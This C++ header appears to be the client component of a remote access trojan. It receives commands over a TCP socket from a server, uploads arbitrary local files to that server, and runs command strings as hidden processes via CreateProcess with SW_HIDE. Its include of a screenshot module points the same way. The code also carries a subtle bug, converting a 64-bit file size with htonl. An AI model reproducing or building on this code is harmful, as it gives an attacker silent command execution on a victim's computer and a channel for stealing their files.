#pragma once

#include "screenshot.hpp"
#include "include/asio.hpp"

#include <fstream>

#include <cstdlib>
#include <vector>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

//----------

using asio::ip::tcp;
using std::uint32_t;
using std::uint64_t;
using std::vector;

using std::wstring;
using std::string;

//----------

string read_from_server(tcp::socket& c_socket) {
	asio::error_code ec;
	uint32_t content_len;

	asio::read(c_socket, asio::buffer(&content_len, sizeof(content_len)), ec);

	if (ec) return "failed";

	content_len = ntohl(content_len);
	vector<char> buffer(content_len);

	asio::read(c_socket, asio::buffer(buffer), ec);

	if (ec) return "failed";

	return string(buffer.begin(), buffer.end());
}

bool send_to_server(tcp::socket& c_socket, const string& content) {
	try {
		uint32_t content_len = static_cast<uint32_t>(content.size());

		content_len = htonl(content_len);

		asio::write(c_socket, asio::buffer(&content_len, sizeof(content_len)));
		asio::write(c_socket, asio::buffer(content));

		return true;
	}
	catch (...) {
		return false;
	}
}

//----------

static wstring string_to_wstr(const string& content) {
    size_t required_size = 0;
    mbstowcs_s(&required_size, nullptr, 0, content.c_str(), 0);

    std::vector<wchar_t> buffer(required_size);

    //*****

    size_t converted_size = 0;
    mbstowcs_s(&converted_size, buffer.data(), buffer.size(), content.c_str(), content.size());

    return wstring(buffer.data(), converted_size - 1);
}

//----------

void show_messagebox(const string title, const string message) {
    wstring wstr_title = string_to_wstr(title);
    wstring wstr_message = string_to_wstr(message);

    MessageBoxW(NULL, wstr_message.c_str(), wstr_title.c_str(), MB_OK | MB_ICONEXCLAMATION);
}

bool send_file_to_server(tcp::socket& c_socket, const wstring& file_path) {
    bool sent;

    std::ifstream file(file_path, std::ios::binary | std::ios::ate);

    if (!file.is_open())
    {
        send_to_server(c_socket, "false");
        return false;
    }

    sent = send_to_server(c_socket, "true");

    if (!sent) return false;

    //*****

    std::streamsize file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    vector<char> buffer(file_size);
    file.read(buffer.data(), file_size);

    file.close();

    //*****

    uint64_t file_size_net = htonl(file_size);

    asio::write(c_socket, asio::buffer(&file_size_net, sizeof(file_size_net)));
    asio::write(c_socket, asio::buffer(buffer));

    return true;
}

//----------

void execute_command(const string command) {
    wstring wstr_command = string_to_wstr(command);

    STARTUPINFO info_s;
    PROCESS_INFORMATION info_p;

    ZeroMemory(&info_s, sizeof(info_s));
    ZeroMemory(&info_p, sizeof(info_p));

    info_s.cb = sizeof(info_s);
    info_s.dwFlags = STARTF_USESHOWWINDOW;
    info_s.wShowWindow = SW_HIDE;

    //*****

    CreateProcess
    (
        NULL,
        &wstr_command[0],
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &info_s,
        &info_p
    );

    CloseHandle(info_p.hProcess);
    CloseHandle(info_p.hThread);
}
